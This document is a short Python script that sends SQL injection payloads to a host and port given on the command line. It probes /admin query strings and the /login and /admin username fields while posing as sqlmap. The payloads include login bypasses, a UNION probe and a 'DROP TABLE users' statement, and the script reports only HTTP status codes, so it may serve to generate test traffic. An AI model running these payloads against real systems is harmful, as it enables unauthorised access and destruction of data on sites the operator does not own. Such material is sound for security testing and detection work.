#!/usr/bin/env python3
"""
curl_sqli.py — SQLi payload injection via requests.
Usage: python3 curl_sqli.py <host> <port>
"""
import sys, time, requests
from requests.exceptions import RequestException

host = sys.argv[1]
port = int(sys.argv[2])
base = f"http://{host}:{port}"
s = requests.Session()
s.headers["User-Agent"] = "sqlmap/1.0-dev"

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "admin'--",
    "' UNION SELECT 1,2,3--",
    "'; DROP TABLE users;--",
    "' OR 'a'='a",
    "1' OR '1'='1' /*",
    "\" OR \"\"=\"",
    "' OR 1=1#",
    "admin' #",
]

def poke(path, method="GET", data=None):
    try:
        if method == "POST":
            r = s.post(base + path, data=data, timeout=5)
        else:
            r = s.get(base + path, timeout=5)
        print(f"[sqli] {method} {path} → {r.status_code}")
    except RequestException as e:
        print(f"[sqli] {method} {path} → ERR {e}")

# GET /admin with injected path query strings
for payload in SQLI_PAYLOADS[:5]:
    poke(f"/admin?id={requests.utils.quote(payload)}")
    time.sleep(0.3)

# POST /login with SQLi in username
for payload in SQLI_PAYLOADS:
    poke("/login", method="POST", data={"username": payload, "password": "x"})
    time.sleep(0.2)

# POST /admin
for payload in SQLI_PAYLOADS[:4]:
    poke("/admin", method="POST", data={"username": payload, "password": "x"})
    time.sleep(0.2)
